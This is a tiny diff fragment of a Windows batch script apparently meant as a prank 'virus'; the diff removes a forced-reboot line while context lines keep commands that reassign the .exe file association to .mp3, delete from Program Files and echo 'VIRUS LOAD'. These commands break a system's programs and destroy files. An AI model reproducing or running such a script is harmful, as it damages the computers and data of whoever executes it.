@@ -80,5 +80,5 @@ Label E: PRIDUROK
 assoc .exe=.mp3
 del c:Program Files/q
 Echo VIRUS LOAD
-shutdown -r -t 1 -c "lol" >nul[/SRC]
+
 
